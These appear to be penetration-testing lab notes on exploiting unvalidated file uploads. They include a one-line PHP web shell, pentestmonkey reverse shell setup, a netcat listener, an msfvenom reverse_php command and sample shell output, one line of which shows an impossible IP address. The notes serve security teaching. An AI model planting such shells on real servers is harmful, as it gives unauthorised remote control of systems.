# File Upload Attacks

File upload vulnerabilities pose significant risks to web applications, arising from inadequate file validation and outdated libraries, enabling attackers to exploit this feature maliciously. Such attacks range from unauthenticated arbitrary file uploads, leading to remote command execution via web shells or reverse shells, to introducing vulnerabilities like XSS or XXE, causing Denial of Service (DoS), or overwriting critical files. Mitigating these risks involves implementing robust validation, secure filters, and avoiding outdated libraries, alongside adopting best practices to fortify applications against these threats.

---

# Absent Validation
- **Description**: Web application lacks validation filters, allowing unrestricted file uploads.
- **Risk**: Attackers can upload malicious scripts (e.g., web shells or reverse shells) to interact with the server directly.

### Arbitrary File Upload
- **Scenario**: A web application allows any file types without restrictions on the front-end or back-end.
- **Steps**:
  1. Upload malicious files like `.php` scripts.
  2. Access uploaded scripts via URLs to execute commands or gain control over the server.

### Identifying Web Framework
- **Objective**: Determine the programming language of the web application to upload compatible malicious scripts.
- **Techniques**:
  1. Check for file extensions in URLs (e.g., `.php`, `.asp`).
  2. Use tools like Burp Intruder or Wappalyzer for automation and detection.
  3. Run web vulnerability scanners like Burp/ZAP for further analysis.

### Vulnerability Identification
- **Testing Steps**:
  1. Create a basic script (e.g., ) and upload it.
     ```
     `<?php echo "Hello";?>`
     ```
  3. Confirm upload success by accessing the file URL (e.g., `/uploads/test.php`).
  4. Verify PHP code execution—if successful, the server lacks validation and executes uploaded code.

---

# Upload Exploitation

### Web Shells
- **Purpose**: Web shells enable attackers to interact with the back-end server, execute commands, and further exploit the system.
- **Options**:
  - **Pre-built Web Shells**:
    - Example: `phpbash.php` from phpbash or shells found in SecLists (`/opt/useful/seclists/Web-Shells` directory in PwnBox).
    - Upload the shell via the vulnerable feature and visit its URL (e.g., `http://SERVER_IP:PORT/uploads/phpbash.php`) to interact with the terminal-like interface.
  - **Custom Web Shell**:
    - Example:
      ```php
      <?php system($_REQUEST['cmd']); ?>
      ```
    - Usage:
      - Upload `shell.php` to the vulnerable application.
      - Execute commands using the `?cmd=` parameter (e.g., `http://SERVER_IP:PORT/uploads/shell.php?cmd=id`).
      - **Tip**: Use browser source view ([CTRL+U]) for better display of command outputs.
    - Limitations: May fail due to restricted functions or server-side security measures.

### Reverse Shells
- **Purpose**: Reverse shells provide an interactive connection back to the attacker's machine, allowing direct control of the compromised server.
- **Steps**:
  1. **Pre-built Reverse Shells**:
     - Reliable options: `pentestmonkey PHP reverse shell` or SecLists reverse shells.
     - Edit the script:
       ```php
       $ip = 'OUR_IP';     // CHANGE THIS
       $port = OUR_PORT;   // CHANGE THIS
       ```
     - Start a netcat listener:
       ```bash
       nc -lvnp OUR_PORT
       ```
     - Upload the script via the web application and visit its URL to execute it (e.g., `http://SERVER_IP:PORT/uploads/reverse.php`).
     - Successful connection:
       ```bash
       connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
       # id
       uid=33(www-data) gid=33(www-data) groups=33(www-data)
       ```
  2. **Custom Reverse Shell**:
     - Generate a script using `msfvenom`:
       ```bash
       msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
       ```
     - Start a listener and upload the script. Execute it to establish the connection:
       ```bash
       connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
       # id
       uid=33(www-data) gid=33(www-data) groups=33(www-data)
       ```
     - **Tip**: Reverse shells are generally more interactive and preferred over web shells. However, if outgoing connections are blocked by firewalls or necessary functions are disabled, web shells may serve as a fallback.

### Key Challenges
- **Web Shell Limitations**:
  - Functions like `system()` may be disabled.
  - Web Application Firewalls (WAFs) may block execution.
- **Reverse Shell Limitations**:
  - Firewalls may prevent outgoing connections.
  - Necessary functions might be disabled, requiring alternative exploitation techniques.

---
